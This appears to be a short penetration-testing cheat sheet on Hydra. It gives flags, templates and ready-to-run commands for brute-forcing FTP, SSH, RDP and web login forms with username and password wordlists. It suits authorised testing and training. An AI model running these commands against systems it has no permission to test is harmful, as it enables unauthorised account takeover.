

## Directory bruteforce:
command: `hydra`

`-l`: for a single user
`-p`: for a single password
`-L`: for a list of users
`-P`: for a list of passwords
`-s`: for choosing another port if the service isn't running on default port.

`hydra -L users.txt -P passwords.txt <ip> <service>`

---
### **Brute force <mark style="background: #239b56;">ftp</mark>:**
- `hydra -L users.txt -P passwords.txt 192.168.1.21 ftp`  or <mark style="background: #f39c12;">ssh</mark> 

---

### **Brute force <mark style="background: #2e86c1;">RDP</mark>:**
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.18.9 -s 3333`  


##### **Notice we use the `-s` when the service isn't running on  the default port.** 



Also to specify a service that's not running on default port:
`hydra -L <username_list> -P <password_list> ftp://192.248.185.3:5554`



---



# **Brute force Login Page:**

Command Template: 

The `http-post-form` to make a HTTP POST request
`username=^USER^` the first `username` could be changed as it's a parameter other webapps might name it differently 
`password=^PASS^` Same as `username` 

`&` added between the ^USER^ and ^PASS^


	hydra -L Users.txt -P Passwords.txt <IP> http-post-form "/<login_url_path>:username=^USER^&password=^PASS^:<Wrong attempt message>"


Command Example:

	hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt 192.238.168.3 http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password"

